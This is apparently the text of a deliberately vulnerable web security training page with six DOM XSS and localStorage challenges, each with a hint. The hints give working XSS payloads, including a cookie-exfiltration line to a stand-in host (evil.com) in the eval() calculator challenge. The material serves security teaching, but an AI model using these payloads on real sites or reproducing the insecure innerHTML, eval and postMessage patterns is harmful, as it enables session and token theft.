1. DOM XSS — URL Fragment HIGH

This greeting message reads from the URL hash and injects it unsafely.

💡 Hint 
Try: dom-xss.html#<img src=x onerror="alert('DOM XSS via hash')">
The page reads location.hash and injects it via innerHTML.

2. DOM XSS — Query Parameter HIGH

Search results rendered directly from query params into the DOM.

💡 Hint 
Try: dom-xss.html?query=<img src=x onerror="alert('XSS')">
The query param is written to the DOM with innerHTML.

3. DOM XSS — document.write() HIGH

User-selected theme is written into the page using document.write equivalent.

💡 Hint 
Try: </div><script>alert('XSS via theme')</script>
Input is placed in innerHTML without sanitization.

4. DOM XSS — eval() Calculator CRITICAL

A "safe" calculator that uses eval() to process expressions.

💡 Hint 
Try: alert(document.cookie)
Or:  fetch('http://evil.com/?c='+document.cookie)
The input is passed directly to eval().

5. DOM XSS — postMessage HIGH

This component listens for messages from any origin and renders them.

Waiting for messages...
💡 Hint 
The page listens for postMessage without checking origin.
From browser console:
  window.postMessage('<img src=x onerror="alert(1)">', '*')

Or from an attacker page:
  targetWindow.postMessage('<script>alert(1)</script>', '*')

6. Sensitive Data in localStorage MEDIUM

User session and tokens stored insecurely in localStorage.

💡 Hint 
Open DevTools → Application → LocalStorage.
Tokens, passwords, and PII are stored in plaintext.
Any XSS can steal them with: JSON.stringify(localStorage)

💡 Hint
